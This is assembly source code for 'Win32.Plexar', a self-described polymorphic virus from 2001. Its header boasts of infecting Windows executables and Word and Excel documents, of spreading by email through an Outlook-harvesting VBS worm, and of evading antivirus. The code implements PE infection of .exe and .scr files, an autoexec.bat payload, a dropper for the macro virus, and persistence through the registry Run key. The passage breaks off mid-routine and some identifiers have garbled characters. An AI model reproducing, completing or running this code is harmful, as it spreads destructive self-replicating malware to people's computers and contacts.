
; 袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴
;                             �< Win32.Plexar >�
;               Designed by LiteSys in Venezuela, South America
;
; PE/DOC/XLS/OUTLOOK Multithreaded Polymorphic Direct Action infector.
;
; Welcome to Plexar, my latest code.
;
; It infects PE files by incrementing the last section, I don't overwrite
; .reloc section, it's preferible to let it alone. In fact, this virus
; avoids infecting some AV or Win32 files that should never be infected.
; This is done by CRC32 comparation.
;
; Infects Word and Excel documents by dropping (thru VBScript) a macro
; module-infectant virus in the normal template and personal.xls that is
; capable of dropping an infected PE file to the Windows directory and then
; running it.
;
; Distributes through Electronic Mail by dropping a VBS worm capable of
; sending infected droppers to every email address in the Outlook address
; book. Sorry but I didn't have any time to code a decent MAPI worm =(.
;
; The Poly engine is another lame table-driven engine written by me =), no
; anti-aver intentions were the reason to write that poly engine, just to
; conceal the code a little. So I think it doesn't desire an explanation
; because the garbage is very lame.
;
; It runs the different routines (word infection, vbs worm, direct action)
; in different threads. As I always said, I don't optimize my code too much.
;
; The payload is very funny and if you're from Venezuela I hope you
; appreciate it. Consists in dropping a simple com file that displays
; some silly stuff in spanish, it runs on autoexec.bat but won't display
; the message until the following rule is complied (this is a very
; kewl idea I learnt from Byway ;D):
;
; If Month <= 7: Day = Month^2 / 3 + 4
; If Month >= 8: Day = Month^2 / 5 - 4
;
; So the payload will run on every month (as a coincidence, the formula
; pointed to December 24th :P). It's not destructive so don't blame me.
;
; This virus has lots of bugs, i've corrected many but still there are a
; lot. It was tested under Win95 (4.10.1111), Win98 (4.10.1998), WinME and
; WinNT (4.0/SP4), the virus worked perfectly under those versions. I don't
; know about Win98 SE and Win2K, since I don't have them installed, I have
; the CDs here but i'm a lazy ass and my HD space is totally phuken.
;
; Virus Size = 12kb. Code not commented. Nor even AVP or Norton (with
; their "high heuristic" bloodhound shit) flagged the infected PE baits,
; except from Norton, which flagged the VBS worm.
;
; If you need to contact me you can use both mail addresses: litesys@monte.as
; or liteno2@softhome.net. Rembember, for decent stuff.
;
; Patria o Muerte: Venceremos.
; LiteSys.
; Venezuela, Julio/Agosto - (c) 2001
; 袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴

.586
.MODEL FLAT, STDCALL

INCLUDE C:\TOOLS\TASM\INCLUDE\WIN32API.INC
INCLUDE C:\TOOLS\TASM\INCLUDE\WINDOWS.INC

EXTRN ExitProcess:PROC
EXTRN MessageBoxExA:PROC

.DATA

 DEBUG                          EQU     FALSE

 OFS                            EQU     <OFFSET [EBP]>
 BY                             EQU     <BYTE PTR [EBP]>
 WO                             EQU     <WORD PTR [EBP]>
 DWO                            EQU     <DWORD PTR [EBP]>
 RDTSC                          EQU     <DW 310Fh>

 APICALL        MACRO   APIz
   CALL DWORD PTR [APIz + EBP]
 ENDM

 Numero_Paginas                 EQU     32h
 K32_W9X                        EQU     0BFF70000h
 GPA_W9X                        EQU     0BFF76DACh
 Virus_Tama쨚                   EQU     (Termina_Plexar - Empieza_Plexar)

 Titulo                         DB      "Plexar."
                                DB      Virus_Tama쨚 / 10000 MOD 10 + 30h
                                DB      Virus_Tama쨚 / 01000 MOD 10 + 30h
                                DB      Virus_Tama쨚 / 00100 MOD 10 + 30h
                                DB      Virus_Tama쨚 / 00010 MOD 10 + 30h
                                DB      Virus_Tama쨚 / 00001 MOD 10 + 30h
                                DB      00h

 Mensaje                        DB      "Plexar (c) 2001 LiteSys "
                                DB      "-- Activado."
                                DB      00h

 REG_SZ                         EQU     <1>
 HKEY_LOCAL_MACHINE             EQU     <80000002h>

.CODE

Empieza_Plexar:

  CALL @Delta
  @Delta:
  POP EAX
  XCHG EBP, EAX
  SUB EBP, OFFSET @Delta

  JMP @@1
   DB 00h, 00h, "[PLEXAR]", 00h, 00h
  @@1:

  CALL @SEH_1

  MOV ESP, DWORD PTR [ESP+8h]
  JMP @FueraHost

  @SEH_1:

  XOR EAX, EAX
  PUSH DWORD PTR FS:[EAX]
  MOV FS:[EAX], ESP

  MOV EDI, DWORD PTR [ESP+8h]
  CALL Busca_K32
  CALL Busca_GPA

  LEA ESI, OFS [CreateFileA]
  LEA EDI, OFS [APIs_K32]
  MOV EBX, DWO [KERNEL32]
  CALL Busca_APIs

  LEA EDX, OFS [RewtDir]
  PUSH EDX
  PUSH MAX_PATH
  APICALL GetCurrentDirectoryA
  OR EAX, EAX
  JZ @FueraHost

  IF DEBUG

  PUSH EBP
  CALL Directa

  PUSH EBP
  CALL Worm_VBS

  PUSH EBP
  CALL Infecta_Word

  JMP @FueraHost

  ELSE

  CALL Thread

  ENDIF

  CALL Er_Pailon

  @FueraHost:

  XOR ECX, ECX
  POP DWORD PTR FS:[ECX]
  POP ECX

  PUSH 12345678h
  ORG $-4
  HostBack                      DD      OFFSET Mentira
  RET

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; El Thread Principal, carga los otros threads.

  Thread        PROC
  PUSHAD

  AND BY [Listo_Directa], 00h

  XOR EAX, EAX
  LEA EBX, OFS [Thread_Directa]
  PUSH EBX
  PUSH EAX
  PUSH EBP
  LEA EBX, OFS [Directa]
  PUSH EBX
  PUSH EAX
  PUSH EAX
  APICALL CreateThread
  MOV DWO [Thread_Directa], EAX
  OR EAX, EAX
  JZ @FinThread

  PUSH 02h
  PUSH EAX
  APICALL SetThreadPriority

  @RevDirect:
  PUSH -1
  PUSH DWO [Thread_Directa]
  APICALL WaitForSingleObject

  CMP BY [Listo_Directa], 01h
  JNZ @RevDirect

  XOR EAX, EAX
  LEA EBX, OFS [Thread_WormVBS]
  PUSH EBX
  PUSH EAX
  PUSH EBP
  LEA EBX, OFS [Worm_VBS]
  PUSH EBX
  PUSH EAX
  PUSH EAX
  APICALL CreateThread
  MOV DWO [Thread_WormVBS], EAX
  OR EAX, EAX
  JZ @FinThread

  PUSH 02h
  PUSH EAX
  APICALL SetThreadPriority

  XOR EAX, EAX
  LEA EBX, OFS [Thread_IWord]
  PUSH EBX
  PUSH EAX
  PUSH EBP
  LEA EBX, OFS [Infecta_Word]
  PUSH EBX
  PUSH EAX
  PUSH EAX
  APICALL CreateThread
  MOV DWO [Thread_IWord], EAX
  OR EAX, EAX
  JZ @FinThread

  PUSH 02h
  PUSH EAX
  APICALL SetThreadPriority

  PUSH -1
  PUSH TRUE
  LEA EAX, OFS [Thread_WormVBS]
  PUSH EAX
  PUSH 02h
  APICALL WaitForMultipleObjects

  @FinThread:

  POPAD
  RET

  Thread        ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; Payload.

  Er_Pailon     PROC
  PUSHAD

  CDQ
  PUSH EDX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH CREATE_NEW
  PUSH EDX
  PUSH EDX
  PUSH GENERIC_WRITE
  LEA EAX, OFS [CocoFrio]
  PUSH EAX
  APICALL CreateFileA
  MOV DWO [PFHandle], EAX
  INC EAX
  JZ @P_Fin
  DEC EAX
  XCHG EBX, EAX

  XOR EDX, EDX
  PUSH EDX
  LEA EAX, OFS [PTemporal]
  PUSH EAX
  PUSH Largo_PProg
  LEA EAX, OFS [Payload_Prog]
  PUSH EAX
  PUSH EBX
  APICALL WriteFile
  OR EAX, EAX
  JZ @P_Fin

  PUSH DWO [PFHandle]
  APICALL CloseHandle

  CDQ
  PUSH EDX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH OPEN_EXISTING
  PUSH EDX
  PUSH EDX
  PUSH GENERIC_WRITE
  LEA EAX, OFS [AutoExec]
  PUSH EAX
  APICALL CreateFileA
  MOV DWO [PFHandle], EAX
  INC EAX
  JZ @P_Fin
  DEC EAX

  CDQ
  PUSH 00000002h
  PUSH EDX
  PUSH EDX
  PUSH EAX
  APICALL SetFilePointer

  CDQ
  PUSH EDX
  LEA EAX, OFS [PTemporal]
  PUSH EAX
  PUSH Largo_CocoFrio-1
  LEA EAX, OFS [CocoFrio]
  PUSH EAX
  PUSH DWO [PFHandle]
  APICALL WriteFile
  OR EAX, EAX
  JZ @P_Fin

  PUSH DWO [PFHandle]
  APICALL CloseHandle
  
  @P_Fin:

  POPAD
  RET
  Er_Pailon     ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; Proceso para buscar la base de KERNEL32

  Busca_K32     PROC

  AND EDI, 0FFFF0000h
  PUSH Numero_Paginas
  POP ECX

  @Compara_K32:

  PUSH EDI

  MOV BX, WORD PTR [EDI]
  OR BX, 03D5Bh                                   ; 5A4D || 3D5B  == 7F5F
  SUB BX, 07F5Fh
  JNZ @Incrementa_K32

  ADD EDI, [EDI+3Ch]
  MOV BX, WORD PTR [EDI]                          ; 4550 && C443  == 4440
  AND BX, 0C443h
  XOR BX, 04440h
  JE @EnK32

  @Incrementa_K32:

  POP EDI

  SUB EDI, 10000h
  LOOP @Compara_K32

  PUSH K32_W9X

  @EnK32:

  POP DWO [KERNEL32]
  RET

  Busca_K32     ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
  DB            5 DUP (90h)

  ; Proceso para buscar a GetProcAddress

  Busca_GPA     PROC

  MOV EBX, DWO [KERNEL32]
  MOV EDI, EBX

  ADD EDI, DWORD PTR [EDI+3Ch]
  MOV EDI, DWORD PTR [EDI+78h]
  ADD EDI, EBX
  MOV DWO [Exports], EDI

  MOV ECX, DWORD PTR [EDI+18h]
  DEC ECX

  MOV EDI, DWORD PTR [EDI+20h]
  ADD EDI, EBX

  XOR EAX, EAX

  @BGPA_1:

  MOV ESI, DWORD PTR [EDI]
  ADD ESI, EBX
  PUSH EDI

  PUSH l_GetProcAddress
  POP EDI
  PUSHAD
  CALL CRC32
  CMP EAX, CRC32_GetProcAddress
  POPAD
  POP EDI
  JE @BGPA_2

  INC EAX
  ADD EDI, 4h

  LOOP @BGPA_1

  PUSH GPA_W9X

  JMP @BGPA_3

  @BGPA_2:

  MOV ESI, DWO [Exports]
  ADD EAX, EAX

  MOV EDI, DWORD PTR [ESI+24h]
  ADD EDI, EBX
  ADD EDI, EAX

  MOVZX EAX, WORD PTR [EDI]
  IMUL EAX, 4h

  MOV EDI, DWORD PTR [ESI+1Ch]
  ADD EDI, EBX
  ADD EDI, EAX

  MOV EAX, DWORD PTR [EDI]
  ADD EAX, EBX

  PUSH EAX

  @BGPA_3:

  POP DWO [GetProcAddress]

  RET

  Busca_GPA     ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; ESI -> Donde Guardar las APIs
  ; EDI -> Cadenas de APIs
  ; EBX -> Modulo

  ; Proceso para buscar las APIs

  Busca_APIs    PROC

  PUSHAD

  MOV DWO [Guardalo], ESI
  XCHG EDI, ESI

  @BA1:
  LEA EDI, OFS [TempAPI]
  @BA2:

  CMP BYTE PTR [ESI], 00h
  JE @BA4

  LODSB
  CMP AL, 0Eh
  JA @BA3

  XOR ECX, ECX
  XCHG CL, AL

  PUSH ESI
  LEA ESI, OFS [PackedAPIs]

  @BA5:
  INC ESI
  CMP BYTE PTR [ESI], 00h
  JNZ @BA5

  LOOP @BA5

  INC ESI
  @BA6:
  MOVSB
  CMP BYTE PTR [ESI], 00h
  JNZ @BA6

  POP ESI
  JMP @BA2

  @BA3:
  STOSB
  JMP @BA2

  @BA4:

  XOR AL, AL
  STOSB

  LEA EAX, OFS [TempAPI]
  PUSH EAX
  PUSH EBX
  CALL [GetProcAddress+EBP]
  NOP

  PUSH ESI
  MOV ESI, 12345678h
  ORG $-4
  Guardalo                      DD      00000000h
  MOV DWORD PTR [ESI], EAX
  ADD DWO [Guardalo], 00000004h
  POP ESI

  INC ESI

  CMP BYTE PTR [ESI], 0FFh
  JNZ @BA1

  @OA7:

  POPAD

  RET

  Busca_APIs    ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; Accion directa.

  Directa       PROC Pascal             DeltaOfs:DWORD

  PUSHAD

  MOV EBP, DeltaOfs

  CALL @SEH_2

  MOV ESP, DWORD PTR [ESP+8h]
  JMP @DIRF

  @SEH_2:

  XOR EAX, EAX
  PUSH DWORD PTR FS:[EAX]
  MOV FS:[EAX], ESP

  LEA EDX, OFS [RewtDir]
  PUSH EDX
  APICALL SetCurrentDirectoryA
  OR EAX, EAX
  JZ @DIRF

  @DIR1:

  LEA EAX, OFS [Busqueda]
  PUSH EAX
  LEA EAX, OFS [Mascara]
  PUSH EAX
  APICALL FindFirstFileA
  MOV DWO [BHandle], EAX
  INC EAX
  JZ @DIR2

  @DIR3:

  LEA EDI, OFS [Busqueda.wfd_szFileName]
  MOV EBX, EDI
  PUSH EBX
  XOR AL, AL
  SCASB
  JNZ $-1
  XCHG ESI, EDI
  SUB ESI, 5h
  OR DWORD PTR [ESI], 20202020h
  MOV EDI, 5h
  CALL CRC32
  POP EBX
  CMP EAX, CRC_EXE                        ; .exe crc32
  JE @Infecta_Este_Exe
  CMP EAX, CRC_SCR                        ; .scr crc32
  JE @Infecta_Este_Exe

  @Retorna_Directa:

  LEA EAX, OFS [Busqueda]
  PUSH EAX
  PUSH DWO [BHandle]
  APICALL FindNextFileA
  OR EAX, EAX
  JNZ @DIR3

  PUSH DWO [BHandle]
  APICALL FindClose

  @DIR2:

  LEA EAX, OFS [Puto_Puto]
  PUSH EAX
  APICALL SetCurrentDirectoryA

  LEA EAX, OFS [Busqueda.wfd_szFileName]
  PUSH EAX
  PUSH MAX_PATH
  APICALL GetCurrentDirectoryA
  CMP EAX, DWO [LargPP]
  JZ @DIRF
  MOV DWO [LargPP], EAX
  JMP @DIR1

  LEA EAX, OFS [RewtDir]
  PUSH EAX
  APICALL SetCurrentDirectoryA

  @DIRF:

  XOR ECX, ECX
  POP DWORD PTR FS:[ECX]
  POP ECX

  IF DEBUG

  POPAD
  RET

  ELSE

  INC BY [Listo_Directa]

  MOV DWO [GuardaEBP], EBP
  POPAD

  MOV EBX, 12345678h
  ORG $-4
  GuardaEBP                     DD      00000000h

  PUSH NULL
  CALL [EBX+ExitThread]

  RET

  ENDIF

  @Infecta_Este_Exe:
    CALL Infecta_PE
    JMP @Retorna_Directa
  
  Directa       ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; Proceso para infectar un PE.
  ;
  ; EBX -> Archivo a infectar

  Infecta_PE    PROC

  PUSHAD

  PUSH DWO [HostBack]
  POP DWO [Guarda_EIP]

  CALL @Seh_IPE

  MOV ESP, [ESP+8h]
  JMP @PEF

  @Seh_IPE:

  XOR EAX, EAX
  PUSH DWORD PTR FS:[EAX]
  MOV FS:[EAX], ESP

  PUSH 019d
  POP ECX

  MOV ESI, EBX
  LEA EDX, OFS [CRCNoInf]

  @CicloNo:

  PUSH 04h
  POP EDI
  PUSH EBX
  PUSH ESI
  PUSH EDX
  PUSH ECX
  CALL CRC32
  POP ECX
  POP EDX
  POP ESI
  POP EBX
  CMP EAX, DWORD PTR [EDX]
  JZ @PEF
  ADD EDX, 4h
  LOOP @CicloNo

  PUSH 00000000h
  PUSH EBX
  APICALL SetFileAttributesA

  XOR EAX, EAX
  PUSH EAX
  PUSH 00000000h
  PUSH OPEN_EXISTING
  PUSH EAX
  PUSH EAX
  PUSH GENERIC_READ + GENERIC_WRITE
  PUSH EBX
  APICALL CreateFileA
  MOV DWO [FHandle], EAX
  INC EAX
  JZ @PEF

  DEC EAX
  PUSH NULL
  PUSH EAX
  APICALL GetFileSize
  MOV DWO [Tama쨚_1], EAX
  INC EAX
  JZ @PE_Close
  DEC EAX

  CMP EAX, 8192d
  JB @PE_Close

  ADD EAX, Virus_Tama쨚 + 1400h
  MOV DWO [Tama쨚_2], EAX

  XOR EDX, EDX
  PUSH EDX
  PUSH EAX
  PUSH EDX
  PUSH PAGE_READWRITE
  PUSH EDX
  PUSH DWO [FHandle]
  APICALL CreateFileMappingA
  MOV DWO [MHandle], EAX
  OR EAX, EAX
  JZ @PE_Close

  XOR EDX, EDX
  PUSH DWO [Tama쨚_2]
  PUSH EDX
  PUSH EDX
  PUSH FILE_MAP_WRITE
  PUSH EAX
  APICALL MapViewOfFile
  MOV DWO [BaseMap], EAX
  OR EAX, EAX
  JZ @PE_CloseMap

  MOV EDI, EAX
  MOV BX, WORD PTR [EDI]  
  AND BX, 3ED4h                            ; "ZM" = 5A4Dh ^ 3ED4h == 1444h
  ADD BX, BX
  XOR BX, 3488h
  JNZ @PE_UnMap

  MOV EBX, DWORD PTR [EDI+3Ch]
  ADD EBX, EDI
  CMP EBX, DWO [BaseMap]
  JB @PE_UnMap
  MOV EDX, DWO [BaseMap]
  ADD EDX, DWO [Tama쨚_1]
  CMP EBX, EDX
  JA @Pe_UnMap

  ADD EDI, [EDI+3Ch]
  MOV BX, WORD PTR [EDI]
  OR BX, 0AEDAh                            ; "EP" = 4550h | 0AEDAh == 0EFDAh
  SUB BX, 0EFDAh
  JNZ @PE_UnMap

  MOV ESI, EDI
  PUSHAD
  ADD ESI, 4Ch
  MOV EDI, 5h
  CALL CRC32
  CMP EAX, CRC_PLXR
  POPAD
  JE @PE_UnMap

  MOV EAX, "rxlp" XOR 0C3E8F2A8h
  XOR EAX, 0C3E8F2A8h
  MOV DWORD PTR [EDI+4Ch], EAX

  ADD ESI, 18h
  MOVZX EAX, WORD PTR [EDI+14h]
  ADD ESI, EAX

  XOR EDX, EDX
  MOVZX EDX, WORD PTR [EDI+06h]
  DEC EDX
  IMUL EDX, 28h
  ADD ESI, EDX
                          
  OR DWORD PTR [ESI+24h], 0A0000020h

  MOV EAX, DWORD PTR [ESI+08h]
  PUSH EAX
  ADD EAX, Virus_Tama쨚 + 400h
  MOV DWORD PTR [ESI+08h], EAX

  MOV EBX, DWORD PTR [EDI+3Ch]
  XOR EDX, EDX
  DIV EBX
  INC EAX
  MUL EBX

  MOV DWORD PTR [ESI+10h], EAX

  MOV EAX, DWORD PTR [ESI+10h]
  ADD EAX, DWORD PTR [ESI+0Ch]
  MOV DWORD PTR [EDI+50h], EAX

  POP EDX

  MOV EAX, DWORD PTR [EDI+28h]
  ADD EAX, DWORD PTR [EDI+34h]
  MOV DWO [HostBack], EAX

  ADD EDX, DWORD PTR [ESI+0Ch]
  MOV DWORD PTR [EDI+28h], EDX

  PUSH EBP
  PUSH EBX
  INC ESP

  POP EBX               ; \
  DEC ESP               ;  \
  PUSH EBX              ;   > "[LSX]" Cadena Ejecutable.
  POP EAX               ;  /
  POP EBP               ; /

  MOV EDI, DWORD PTR [ESI+14h]
  ADD EDI, DWORD PTR [ESI+08h]
  ADD EDI, DWO [BaseMap]
  MOV ECX, Virus_Tama쨚 / 4
  SUB EDI, Virus_Tama쨚 + 400h
  LEA ESI, OFS [Empieza_Plexar]
  CALL PXPE

  PUSH DWO [Tama쨚_2]
  POP DWO [Tama쨚_1]

  @PE_UnMap:

  XOR EAX, EAX
  PUSH EAX
  PUSH EAX
  PUSH DWO [Tama쨚_1]
  PUSH DWO [FHandle]
  APICALL SetFilePointer

  PUSH DWO [FHandle]
  APICALL SetEndOfFile

  PUSH DWO [BaseMap]
  APICALL UnmapViewOfFile

  @PE_CloseMap:

  PUSH DWO [MHandle]
  APICALL CloseHandle

  @PE_Close:

  PUSH DWO [FHandle]
  APICALL CloseHandle

  @PEF:

  XOR ECX, ECX
  POP DWORD PTR FS:[ECX]
  POP ECX

  PUSH DWO [Guarda_EIP]
  POP DWO [HostBack]

  POPAD
  RET

  Infecta_PE    ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; Este proceso suelta en disco un archivo PE vacio.
  ;
  ; EBX -> Nombre

  Droppear_PE    PROC
  PUSHAD

  XOR EAX, EAX
  PUSH EAX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH CREATE_ALWAYS
  PUSH EAX
  PUSH EAX
  PUSH GENERIC_READ + GENERIC_WRITE
  PUSH EBX
  APICALL CreateFileA
  MOV DWO [FHandle_DPE], EAX
  INC EAX
  JZ @Fin_DPE
  DEC EAX

  XOR EBX, EBX
  PUSH EBX
  PUSH 32768d
  PUSH EBX
  PUSH PAGE_READWRITE
  PUSH EBX
  PUSH EAX
  APICALL CreateFileMappingA
  MOV DWO [MHandle_DPE], EAX
  OR EAX, EAX
  JZ @DPE_Cierra

  XOR EBX, EBX
  PUSH 32768d
  PUSH EBX
  PUSH EBX
  PUSH FILE_MAP_WRITE
  PUSH EAX
  APICALL MapViewOfFile
  MOV DWO [BaseMap_DPE], EAX
  OR EAX, EAX
  JZ @DPE_CierraMap

  PUSH EAX
  LEA EAX, OFS [Dropper]
  PUSH EAX
  CALL _aP_depack_asm
  ADD ESP, 08h

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH EAX
  PUSH DWO [FHandle_DPE]
  APICALL SetFilePointer

  @DPE_DesMapea:

  PUSH DWO [BaseMap_DPE]
  APICALL UnmapViewOfFile

  @DPE_CierraMap:

  PUSH DWO [MHandle_DPE]
  APICALL CloseHandle

  @DPE_Cierra:

  PUSH DWO [FHandle_DPE]
  APICALL SetEndOfFile

  PUSH DWO [FHandle_DPE]
  APICALL CloseHandle

  POPAD
  RET

  @Fin_DPE:

  POPAD
  STC
  RET

  Droppear_PE    ENDP

  DB       00h, 00h
  DB       "< Virus Plexar (c) Julio/Agosto 2001 - Escrito por LiteSys >"
  DB       00h, 00h
  DB       "[ Hecho en Venezuela ]"
  DB       00h, 00h

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

 ; Proceso para soltar el virus macro de Word.

  Infecta_Word   PROC Pascal            DeltaOfs:DWORD

  PUSHAD

  MOV EBP, DeltaOfs

  CALL @SEH_3

  MOV ESP, DWORD PTR [ESP+8h]
  JMP @IW_Fin

  @SEH_3:

  XOR EAX, EAX
  PUSH DWORD PTR FS:[EAX]
  MOV FS:[EAX], ESP

  PUSH PAGE_READWRITE
  PUSH MEM_COMMIT + MEM_RESERVE + MEM_TOP_DOWN
  PUSH MAX_PATH
  PUSH NULL
  APICALL VirtualAlloc
  MOV DWO [VFreeZ], EAX
  OR EAX, EAX
  JZ @IW_Fin

  PUSH MAX_PATH
  PUSH EAX
  APICALL GetWindowsDirectoryA
  OR EAX, EAX
  JZ @IW_Fin
 
  PUSH DWO [VFreeZ]
  APICALL SetCurrentDirectoryA
  OR EAX, EAX
  JZ @IW_Fin

  PUSH MEM_DECOMMIT
  PUSH MAX_PATH
  PUSH 12345678h
  ORG $-4
  VFreeZ                        DD      00000000h
  APICALL VirtualFree

  LEA EBX, OFS [WScript_Exe]
  CALL @Existe_Archivo
  JNC @VBS_Fin

  LEA EBX, OFS [Raxelp_$$$]
  CALL @Existe_Archivo
  JC @IW_Fin

  LEA EDI, OFS [Macaco]
  PUSH 08h
  POP ECX
  @IW2:
  PUSH 25d
  POP EBX
  CALL Random
  ADD EAX, 65d
  STOSB
  LOOP @IW2

  MOV EAX, "$$$."
  STOSD
  XOR AL, AL
  STOSB

  LEA EBX, OFS [Macaco]
  CALL Droppear_PE
  JC @IW_Fin

  LEA EBX, OFS [Macaco]
  CALL Infecta_PE

  XOR EAX, EAX
  PUSH EAX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH OPEN_EXISTING
  PUSH EAX
  PUSH EAX
  PUSH GENERIC_READ + GENERIC_WRITE
  LEA EAX, OFS [Macaco]
  PUSH EAX
  APICALL CreateFileA
  MOV DWO [FHandle_IW], EAX
  INC EAX
  JZ @IW_Fin
  DEC EAX

  PUSH NULL
  PUSH EAX
  APICALL GetFileSize
  MOV DWO [Tama쨚_IW], EAX
  INC EAX
  JZ @IW_CierraFile

  XOR EAX, EAX
  PUSH EAX
  PUSH EAX
  PUSH EAX
  PUSH PAGE_READWRITE
  PUSH EAX
  PUSH DWO [FHandle_IW]
  APICALL CreateFileMappingA
  MOV DWO [MHandle], EAX
  OR EAX, EAX
  JZ @IW_CierraFile

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH EBX
  PUSH FILE_MAP_READ + FILE_MAP_WRITE
  PUSH EAX
  APICALL MapViewOfFile
  MOV DWO [BaseMap_IW], EAX
  OR EAX, EAX
  JZ @IW_CierraMap

  PUSH PAGE_READWRITE
  PUSH MEM_COMMIT + MEM_RESERVE + MEM_TOP_DOWN
  MOV EAX, DWO [Tama쨚_IW]
  ADD EAX, EAX
  ADD EAX, 1000h
  PUSH EAX
  PUSH NULL
  APICALL VirtualAlloc
  MOV DWO [Memoria_IW], EAX
  OR EAX, EAX
  JZ @IW_Fin

  MOV ECX, DWO [Tama쨚_IW]
  MOV EDI, EAX
  MOV ESI, DWO [BaseMap_IW]

  @Conve:

  LODSB
  CALL @Hexa
  STOSW

  LOOP @Conve

  XOR EAX, EAX
  STOSD

  PUSH DWO [BaseMap_IW]
  APICALL UnmapViewOfFile

  PUSH DWO [MHandle_IW]
  APICALL CloseHandle

  PUSH DWO [FHandle_IW]
  APICALL CloseHandle

  XOR EAX, EAX
  PUSH EAX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH CREATE_NEW
  PUSH EAX
  PUSH EAX
  PUSH GENERIC_READ + GENERIC_WRITE
  LEA EAX, OFS [Raxelp_$$$]
  PUSH EAX
  APICALL CreateFileA
  MOV DWO [FHandle_IW], EAX
  INC EAX
  JZ @IW_Fin

  DEC EAX
  XOR EBX, EBX
  PUSH EBX
  PUSH 131072d
  PUSH EBX
  PUSH PAGE_READWRITE
  PUSH EBX
  PUSH EAX
  APICALL CreateFileMappingA
  MOV DWO [MHandle_IW], EAX
  OR EAX, EAX
  JZ @IW_CierraFile

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH EBX
  PUSH FILE_MAP_READ + FILE_MAP_WRITE
  PUSH EAX
  APICALL MapViewOfFile
  MOV DWO [BaseMap_IW], EAX
  OR EAX, EAX
  JZ @IW_CierraMap

  MOV EDI, EAX
  LEA ESI, OFS [Virus_Macro]
  PUSH L_Virus_Macro
  POP ECX
  REP MOVSB

  MOV ESI, DWO [Memoria_IW]
  XOR EDX, EDX
  XOR EAX, EAX

  @IW_B:

  MOVSB
  INC EDX
  CMP EDX, 200d
  JNZ @IW_D

  MOV AL, '"'
  STOSB
  MOV AX, 0A0Dh
  STOSW
  MOV EAX, "adoj"
  STOSD
  MOV EAX, 'j = '
  STOSD
  MOV EAX, " ado"
  STOSD
  MOV AX, " +"
  STOSW
  MOV AL, '"'
  STOSB

  ; joda = joda + "

  XOR EAX, EAX
  XOR EDX, EDX

  @IW_D:

  CMP BYTE PTR [ESI], AL
  JNZ @IW_B

  MOV AL, '"'
  STOSB
  MOV AX, 0A0Dh
  STOSW

  LEA ESI, OFS [Virus_Macro_2]
  PUSH L_Virus_Macro_2
  POP ECX
  REP MOVSB

  PUSH DWO [BaseMap_IW]
  APICALL UnmapViewOfFile

  PUSH DWO [MHandle_IW]
  APICALL CloseHandle

  SUB EDI, DWO [BaseMap_IW]
  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH EDI
  PUSH DWO [FHandle_IW]
  APICALL SetFilePointer

  PUSH DWO [FHandle_IW]
  APICALL SetEndOfFile

  PUSH DWO [FHandle_IW]
  APICALL CloseHandle

  PUSH MEM_DECOMMIT
  MOV EAX, DWO [Tama쨚_IW]
  ADD EAX, EAX
  ADD EAX, 1000h
  PUSH EAX
  PUSH DWO [Memoria_IW]
  APICALL VirtualFree
 
  XOR EAX, EAX
  PUSH EAX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH CREATE_ALWAYS
  PUSH EAX
  PUSH EAX
  PUSH GENERIC_WRITE
  LEA EBX, OFS [Plxwrd_vbs]
  PUSH EBX
  APICALL CreateFileA
  MOV DWO [FHandle], EAX
  INC EAX
  JZ @IW_Fin
  DEC EAX

  XOR EBX, EBX
  PUSH EBX
  LEA EDX, OFS [Scriptum]
  PUSH EDX
  PUSH Largo_MVBS
  LEA EDX, OFS [Macro_VBS]
  PUSH EDX
  PUSH EAX
  APICALL WriteFile

  PUSH DWO [FHandle_IW]
  APICALL CloseHandle

  CALL @IW_Q
  DB "SHLWAPI.DLL", 00h
  @IW_Q: APICALL LoadLibraryA
  OR EAX, EAX
  JZ @IW_Fin

  CALL @IW_K
  DB "SHSetValueA", 00h
  @IW_K: PUSH EAX
  APICALL GetProcAddress
  OR EAX, EAX
  JZ @IW_Fin

  PUSH 11d
  LEA EBX, OFS [Plxwrd_vbs]
  PUSH EBX
  PUSH REG_SZ
  CALL @IW_L
  DB "Plexar", 00h
  @IW_L: CALL @IW_M
  DB "Software\Microsoft\Windows\CurrentVersion\Run", 00h
  @IW_M: PUSH HKEY_LOCAL_MACHINE
  CALL EAX

  @IW_Fin:

  XOR ECX, ECX
  POP DWORD PTR FS:[ECX]
  POP ECX

  IF DEBUG

  POPAD
  RET

  ELSE

  MOV DWO [GuardaEBP2], EBP
  POPAD

  MOV EBX, 12345678h
